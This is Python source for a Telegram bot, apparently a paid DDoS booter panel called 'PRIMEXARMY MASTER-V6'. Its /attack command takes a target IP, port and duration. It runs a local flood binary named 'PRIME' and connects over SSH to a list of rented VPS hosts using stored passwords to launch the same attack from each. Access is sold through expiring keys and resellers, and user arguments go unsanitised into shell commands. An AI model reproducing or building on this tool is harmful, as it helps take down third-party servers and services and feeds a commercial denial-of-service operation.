import os, time, json, paramiko, random, string, threading, subprocess
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from telegram import Update
from datetime import datetime

# CONFIG (Variables se uthayega)
TELEGRAM_TOKEN = os.getenv("API_KEY") 
OWNER_ID = int(os.getenv("OWNER_ID", 0))

FILES = ["vps.json", "users.json", "keys.json", "resellers.json"]
for f in FILES: 
    if not os.path.exists(f): 
        with open(f, 'w') as out: json.dump({} if "vps" not in f else [], out)

def load_data(file):
    with open(file, 'r') as f: return json.load(f)

def save_data(file, data):
    with open(file, 'w') as f: json.dump(data, f, indent=2)

BANNER = "⚔️ 𝗣𝗥𝗜𝗠𝗘𝗫𝗔𝗥𝗠𝗬 𝗠𝗔𝗦𝗧𝗘𝗥-𝗩𝟲 ⚔️"

def is_auth(uid):
    uid_str = str(uid)
    users = load_data("users.json")
    resellers = load_data("resellers.json")
    if uid == OWNER_ID or uid_str in resellers: return True
    if uid_str in users and users[uid_str]['expiry'] > time.time(): return True
    return False

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_auth(update.effective_user.id):
        await update.message.reply_text("❌ No Access!")
        return
    if len(context.args) < 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <time>")
        return
    
    ip, port, dur = context.args
    await update.message.reply_text(f"🚀 **ATTACK SENT!**\n🎯 `{ip}:{port}` | ⏳ `{dur}s`", parse_mode="Markdown")
    
    # 1. LOCAL RAILWAY ATTACK
    subprocess.Popen(f"./PRIME {ip} {port} {dur}", shell=True)
    
    # 2. VPS ATTACK
    vps_servers = load_data("vps.json")
    for vps in vps_servers:
        threading.Thread(target=ssh_exec, args=(vps, ip, port, dur)).start()

def ssh_exec(vps, ip, port, dur):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps['ip'], username=vps['user'], password=vps['pass'], timeout=10)
        ssh.exec_command(f"chmod +x PRIME && ./PRIME {ip} {port} {dur} > /dev/null 2>&1 &")
        ssh.close()
    except: pass

async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != str(OWNER_ID): return
    days = int(context.args[0]) if context.args else 30
    key = f"PRIME-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
    keys = load_data("keys.json")
    keys[key] = {"dur": days * 86400}
    save_data("keys.json", keys)
    await update.message.reply_text(f"🔑 Key: `{key}` ({days} Days)", parse_mode="Markdown")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    key = context.args[0].upper() if context.args else ""
    keys = load_data("keys.json")
    if key in keys:
        users = load_data("users.json")
        users[uid] = {"expiry": time.time() + keys[key]["dur"]}
        save_data("users.json", users)
        del keys[key]
        save_data("keys.json", keys)
        await update.message.reply_text("✅ Account Activated!")
    else:
        await update.message.reply_text("❌ Invalid Key!")

if __name__ == "__main__":
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("gen", gen))
    app.add_handler(CommandHandler("redeem", redeem))
    app.run_polling()